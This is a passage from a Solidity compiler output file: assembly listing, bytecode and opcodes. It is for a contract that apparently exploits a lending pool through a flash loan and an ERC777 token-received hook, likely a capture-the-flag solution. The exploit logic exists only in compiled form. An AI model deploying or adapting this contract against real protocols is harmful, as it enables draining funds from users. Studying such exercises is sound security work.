\"#utility.yul\":15181:15182   */\n      dup2\n        /* \"#utility.yul\":15176:15179   */\n      dup5\n        /* \"#utility.yul\":15172:15183   */\n      add\n        /* \"#utility.yul\":15165:15204   */\n      mstore\n        /* \"#utility.yul\":15137:15139   */\n      0x20\n        /* \"#utility.yul\":15134:15135   */\n      dup2\n        /* \"#utility.yul\":15130:15140   */\n      add\n        /* \"#utility.yul\":15125:15140   */\n      swap1\n      pop\n        /* \"#utility.yul\":15101:15214   */\n      jump(tag_291)\n    tag_293:\n        /* \"#utility.yul\":15248:15249   */\n      0x00\n        /* \"#utility.yul\":15239:15245   */\n      dup5\n        /* \"#utility.yul\":15234:15237   */\n      dup5\n        /* \"#utility.yul\":15230:15246   */\n      add\n        /* \"#utility.yul\":15223:15250   */\n      mstore\n        /* \"#utility.yul\":15072:15256   */\n      pop\n        /* \"#utility.yul\":15010:15256   */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":15262:15364   */\n    tag_134:\n        /* \"#utility.yul\":15303:15309   */\n      0x00\n        /* \"#utility.yul\":15354:15356   */\n      0x1f\n        /* \"#utility.yul\":15350:15357   */\n      not\n        /* \"#utility.yul\":15345:15347   */\n      0x1f\n        /* \"#utility.yul\":15338:15343   */\n      dup4\n        /* \"#utility.yul\":15334:15348   */\n      add\n        /* \"#utility.yul\":15330:15358   */\n      and\n        /* \"#utility.yul\":15320:15358   */\n      swap1\n      pop\n        /* \"#utility.yul\":15262:15364   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":15370:15743   */\n    tag_135:\n        /* \"#utility.yul\":15456:15459   */\n      0x00\n        /* \"#utility.yul\":15484:15522   */\n      tag_296\n        /* \"#utility.yul\":15516:15521   */\n      dup3\n        /* \"#utility.yul\":15484:15522   */\n      tag_131\n      jump\t// in\n    tag_296:\n        /* \"#utility.yul\":15538:15608   */\n      tag_297\n        /* \"#utility.yul\":15601:15607   */\n      dup2\n        /* \"#utility.yul\":15596:15599   */\n      dup6\n        /* \"#utility.yul\":15538:15608   */\n      tag_132\n      jump\t// in\n    tag_297:\n        /* \"#utility.yul\":15531:15608   */\n      swap4\n      pop\n        /* \"#utility.yul\":15617:15682   */\n      tag_298\n        /* \"#utility.yul\":15675:15681   */\n      dup2\n        /* \"#utility.yul\":15670:15673   */\n      dup6\n        /* \"#utility.yul\":15663:15667   */\n      0x20\n        /* \"#utility.yul\":15656:15661   */\n      dup7\n        /* \"#utility.yul\":15652:15668   */\n      add\n        /* \"#utility.yul\":15617:15682   */\n      tag_133\n      jump\t// in\n    tag_298:\n        /* \"#utility.yul\":15707:15736   */\n      tag_299\n        /* \"#utility.yul\":15729:15735   */\n      dup2\n        /* \"#utility.yul\":15707:15736   */\n      tag_134\n      jump\t// in\n    tag_299:\n        /* \"#utility.yul\":15702:15705   */\n      dup5\n        /* \"#utility.yul\":15698:15737   */\n      add\n        /* \"#utility.yul\":15691:15737   */\n      swap2\n      pop\n        /* \"#utility.yul\":15460:15743   */\n      pop\n        /* \"#utility.yul\":15370:15743   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":15749:16423   */\n    tag_80:\n        /* \"#utility.yul\":15961:15965   */\n      0x00\n        /* \"#utility.yul\":15999:16002   */\n      0x80\n        /* \"#utility.yul\":15988:15997   */\n      dup3\n        /* \"#utility.yul\":15984:16003   */\n      add\n        /* \"#utility.yul\":15976:16003   */\n      swap1\n      pop\n        /* \"#utility.yul\":16013:16101   */\n      tag_301\n        /* \"#utility.yul\":16098:16099   */\n      0x00\n        /* \"#utility.yul\":16087:16096   */\n      dup4\n        /* \"#utility.yul\":16083:16100   */\n      add\n        /* \"#utility.yul\":16074:16080   */\n      dup8\n        /* \"#utility.yul\":16013:16101   */\n      tag_130\n      jump\t// in\n    tag_301:\n        /* \"#utility.yul\":16111:16183   */\n      tag_302\n        /* \"#utility.yul\":16179:16181   */\n      0x20\n        /* \"#utility.yul\":16168:16177   */\n      dup4\n        /* \"#utility.yul\":16164:16182   */\n      add\n        /* \"#utility.yul\":16155:16161   */\n      dup7\n        /* \"#utility.yul\":16111:16183   */\n      tag_100\n      jump\t// in\n    tag_302:\n        /* \"#utility.yul\":16193:16265   */\n      tag_303\n        /* \"#utility.yul\":16261:16263   */\n      0x40\n        /* \"#utility.yul\":16250:16259   */\n      dup4\n        /* \"#utility.yul\":16246:16264   */\n      add\n        /* \"#utility.yul\":16237:16243   */\n      dup6\n        /* \"#utility.yul\":16193:16265   */\n      tag_113\n      jump\t// in\n    tag_303:\n        /* \"#utility.yul\":16312:16321   */\n      dup2\n        /* \"#utility.yul\":16306:16310   */\n      dup2\n        /* \"#utility.yul\":16302:16322   */\n      sub\n        /* \"#utility.yul\":16297:16299   */\n      0x60\n        /* \"#utility.yul\":16286:16295   */\n      dup4\n        /* \"#utility.yul\":16282:16300   */\n      add\n        /* \"#utility.yul\":16275:16323   */\n      mstore\n        /* \"#utility.yul\":16340:16416   */\n      tag_304\n        /* \"#utility.yul\":16411:16415   */\n      dup2\n        /* \"#utility.yul\":16402:16408   */\n      dup5\n        /* \"#utility.yul\":16340:16416   */\n      tag_135\n      jump\t// in\n    tag_304:\n        /* \"#utility.yul\":16332:16416   */\n      swap1\n      pop\n        /* \"#utility.yul\":15749:16423   */\n      swap6\n      swap5\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa26469706673582212204d4866c73e0eeae3757b9b4b0eb8a2058825560c7dc4d890c3d7f5b7dee6ad9864736f6c63430008130033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "60806040523480156200001157600080fd5b50604051620013a5380380620013a58339818101604052810190620000379190620001f0565b836000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555082600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555084600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555081600360006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600460006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550505050505062000278565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000620001b8826200018b565b9050919050565b620001ca81620001ab565b8114620001d657600080fd5b50565b600081519050620001ea81620001bf565b92915050565b600080600080600060a086880312156200020f576200020e62000186565b5b60006200021f88828901620001d9565b95505060206200023288828901620001d9565b94505060406200024588828901620001d9565b93505060606200025888828901620001d9565b92505060806200026b88828901620001d9565b9150509295509295909350565b61111d80620002886000396000f3fe608060405234801561001057600080fd5b50600436106100405760003560e01c806223de291461004557806323e30c8b146100615780639e5faafc14610091575b600080fd5b61005f600480360381019061005a9190610a12565b61009b565b005b61007b60048036038101906100769190610ae1565b61020d565b6040516100889190610b94565b60405180910390f35b6100996106b5565b005b6000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b815260040161011a9190610bbe565b602060405180830381865afa158015610137573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061015b9190610bee565b90506000810361016b5750610203565b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c5ebeaec6828a857425466f800006040518263ffffffff1660e01b81526004016101cf9190610c60565b600060405180830381600087803b1580156101e957600080fd5b505af11580156101fd573d6000803e3d6000fd5b50505050505b5050505050505050565b60003073ffffffffffffffffffffffffffffffffffffffff168773ffffffffffffffffffffffffffffffffffffffff161461027d576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161027490610cd8565b60405180910390fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168673ffffffffffffffffffffffffffffffffffffffff161461030b576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161030290610d44565b60405180910390fd5b6000841461034e576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161034590610db0565b60405180910390fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663095ea7b3600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16876040518363ffffffff1660e01b81526004016103cb929190610ddf565b6020604051808303816000875af11580156103ea573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061040e9190610e40565b61041757600080fd5b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663465a7007866040518263ffffffff1660e01b81526004016104729190610e6d565b600060405180830381600087803b15801561048c57600080fd5b505af11580156104a0573d6000803e3d6000fd5b50505050600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c5ebeaec60006040518263ffffffff1660e01b81526004016105009190610ec3565b600060405180830381600087803b15801561051a57600080fd5b505af115801561052e573d6000803e3d6000fd5b50505050600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16639835e092866040518263ffffffff1660e01b815260040161058d9190610e6d565b600060405180830381600087803b1580156105a757600080fd5b505af11580156105bb573d6000803e3d6000fd5b5050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663095ea7b3600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16876040518363ffffffff1660e01b815260040161063c929190610ddf565b6020604051808303816000875af115801561065b573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061067f9190610e40565b61068857600080fd5b7f439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd990509695505050505050565b600460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166329965a1d60007fb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b306040518463ffffffff1660e01b815260040161073593929190610f26565b600060405180830381600087803b15801561074f57600080fd5b505af1158015610763573d6000803e3d6000fd5b505050506000600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663613255ab60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b81526004016107e49190610bbe565b602060405180830381865afa158015610801573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906108259190610bee565b9050600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16635cffe9de3060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1684600060405160200161089a9190610f9b565b6040516020818303038152906040526040518563ffffffff1660e01b81526004016108c8949392919061109b565b6020604051808303816000875af11580156108e7573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061090b9190610e40565b5050565b600080fd5b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061094482610919565b9050919050565b61095481610939565b811461095f57600080fd5b50565b6000813590506109718161094b565b92915050565b6000819050919050565b61098a81610977565b811461099557600080fd5b50565b6000813590506109a781610981565b92915050565b600080fd5b600080fd5b600080fd5b60008083601f8401126109d2576109d16109ad565b5b8235905067ffffffffffffffff8111156109ef576109ee6109b2565b5b602083019150836001820283011115610a0b57610a0a6109b7565b5b9250929050565b60008060008060008060008060c0898b031215610a3257610a3161090f565b5b6000610a408b828c01610962565b9850506020610a518b828c01610962565b9750506040610a628b828c01610962565b9650506060610a738b828c01610998565b955050608089013567ffffffffffffffff811115610a9457610a93610914565b5b610aa08b828c016109bc565b945094505060a089013567ffffffffffffffff811115610ac357610ac2610914565b5b610acf8b828c016109bc565b92509250509295985092959890939650565b60008060008060008060a08789031215610afe57610afd61090f565b5b6000610b0c89828a01610962565b9650506020610b1d89828a01610962565b9550506040610b2e89828a01610998565b9450506060610b3f89828a01610998565b935050608087013567ffffffffffffffff811115610b6057610b5f610914565b5b610b6c89828a016109bc565b92509250509295509295509295565b6000819050919050565b610b8e81610b7b565b82525050565b6000602082019050610ba96000830184610b85565b92915050565b610bb881610939565b82525050565b6000602082019050610bd36000830184610baf565b92915050565b600081519050610be881610981565b92915050565b600060208284031215610c0457610c0361090f565b5b6000610c1284828501610bd9565b91505092915050565b6000819050919050565b6000819050919050565b6000610c4a610c45610c4084610c1b565b610c25565b610977565b9050919050565b610c5a81610c2f565b82525050565b6000602082019050610c756000830184610c51565b92915050565b600082825260208201905092915050565b7f57726f6e6720696e69746961746f720000000000000000000000000000000000600082015250565b6000610cc2600f83610c7b565b9150610ccd82610c8c565b602082019050919050565b60006020820190508181036000830152610cf181610cb5565b9050919050565b7f4e6f7420676f6c64000000000000000000000000000000000000000000000000600082015250565b6000610d2e600883610c7b565b9150610d3982610cf8565b602082019050919050565b60006020820190508181036000830152610d5d81610d21565b9050919050565b7f466565206d757374206265203000000000000000000000000000000000000000600082015250565b6000610d9a600d83610c7b565b9150610da582610d64565b602082019050919050565b60006020820190508181036000830152610dc981610d8d565b9050919050565b610dd981610977565b82525050565b6000604082019050610df46000830185610baf565b610e016020830184610dd0565b9392505050565b60008115159050919050565b610e1d81610e08565b8114610e2857600080fd5b50565b600081519050610e3a81610e14565b92915050565b600060208284031215610e5657610e5561090f565b5b6000610e6484828501610e2b565b91505092915050565b6000602082019050610e826000830184610dd0565b92915050565b6000819050919050565b6000610ead610ea8610ea384610e88565b610c25565b610977565b9050919050565b610ebd81610e92565b82525050565b6000602082019050610ed86000830184610eb4565b92915050565b6000819050919050565b60008160001b9050919050565b6000610f10610f0b610f0684610ede565b610ee8565b610b7b565b9050919050565b610f2081610ef5565b82525050565b6000606082019050610f3b6000830186610baf565b610f486020830185610f17565b610f556040830184610baf565b949350505050565b600060ff82169050919050565b6000610f85610f80610f7b84610e88565b610c25565b610f5d565b9050919050565b610f9581610f6a565b82525050565b6000602082019050610fb06000830184610f8c565b92915050565b6000610fd1610fcc610fc784610919565b610c25565b610919565b9050919050565b6000610fe382610fb6565b9050919050565b6000610ff582610fd8565b9050919050565b61100581610fea565b82525050565b600081519050919050565b600082825260208201905092915050565b60005b8381101561104557808201518184015260208101905061102a565b60008484015250505050565b6000601f19601f8301169050919050565b600061106d8261100b565b6110778185611016565b9350611087818560208601611027565b61109081611051565b840191505092915050565b60006080820190506110b06000830187610ffc565b6110bd6020830186610baf565b6110ca6040830185610dd0565b81810360608301526110dc8184611062565b90509594505050505056fea26469706673582212204d4866c73e0eeae3757b9b4b0eb8a2058825560c7dc4d890c3d7f5b7dee6ad9864736f6c63430008130033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH3 0x11 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH3 0x13A5 CODESIZE SUB DUP1 PUSH3 0x13A5 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH3 0x37 SWAP2 SWAP1 PUSH3 0x1F0 JUMP JUMPDEST DUP4 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP3 PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP5 PUSH1 0x2 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP2 PUSH1 0x3 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP1 PUSH1 0x4 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP POP POP POP POP PUSH3 0x278 JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x1B8 DUP3 PUSH3 0x18B JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH3 0x1CA DUP2 PUSH3 0x1AB JUMP JUMPDEST DUP2 EQ PUSH3 0x1D6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH3 0x1EA DUP2 PUSH3 0x1BF JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0xA0 DUP7 DUP9 SUB SLT ISZERO PUSH3 0x20F JUMPI PUSH3 0x20E PUSH3 0x186 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH3 0x21F DUP9 DUP3 DUP10 ADD PUSH3 0x1D9 JUMP JUMPDEST SWAP6 POP POP PUSH1 0x20 PUSH3 0x232 DUP9 DUP3 DUP10 ADD PUSH3 0x1D9 JUMP JUMPDEST SWAP5 POP POP PUSH1 0x40 PUSH3 0x245 DUP9 DUP3 DUP10 ADD PUSH3 0x1D9 JUMP JUMPDEST SWAP4 POP POP PUSH1 0x60 PUSH3 0x258 DUP9 DUP3 DUP10 ADD PUSH3 0x1D9 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x80 PUSH3 0x26B DUP9 DUP3 DUP10 ADD PUSH3 0x1D9 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP6 POP SWAP3 SWAP6 SWAP1 SWAP4 POP JUMP JUMPDEST PUSH2 0x111D DUP1 PUSH3 0x288 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x40 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH3 0x23DE29 EQ PUSH2 0x45 JUMPI DUP1 PUSH4 0x23E30C8B EQ PUSH2 0x61 JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x91 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x5F PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x5A SWAP2 SWAP1 PUSH2 0xA12 JUMP JUMPDEST PUSH2 0x9B JUMP JUMPDEST STOP JUMPDEST PUSH2 0x7B PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x76 SWAP2 SWAP1 PUSH2 0xAE1 JUMP JUMPDEST PUSH2 0x20D JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x88 SWAP2 SWAP1 PUSH2 0xB94 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x99 PUSH2 0x6B5 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x70A08231 PUSH1 0x3 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x11A SWAP2 SWAP1 PUSH2 0xBBE JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x137 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x15B SWAP2 SWAP1 PUSH2 0xBEE JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP2 SUB PUSH2 0x16B JUMPI POP PUSH2 0x203 JUMP JUMPDEST PUSH1 0x3 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xC5EBEAEC PUSH9 0x28A857425466F80000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1CF SWAP2 SWAP1 PUSH2 0xC60 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1E9 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1FD JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP JUMPDEST POP POP POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 ADDRESS PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP8 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x27D JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x274 SWAP1 PUSH2 0xCD8 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP7 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x30B JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x302 SWAP1 PUSH2 0xD44 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 DUP5 EQ PUSH2 0x34E JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x345 SWAP1 PUSH2 0xDB0 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x95EA7B3 PUSH1 0x3 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP8 PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x3CB SWAP3 SWAP2 SWAP1 PUSH2 0xDDF JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x3EA JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x40E SWAP2 SWAP1 PUSH2 0xE40 JUMP JUMPDEST PUSH2 0x417 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x3 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x465A7007 DUP7 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x472 SWAP2 SWAP1 PUSH2 0xE6D JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x48C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x4A0 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x3 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xC5EBEAEC PUSH1 0x0 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x500 SWAP2 SWAP1 PUSH2 0xEC3 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x51A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x52E JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x3 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x9835E092 DUP7 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x58D SWAP2 SWAP1 PUSH2 0xE6D JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x5A7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x5BB JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 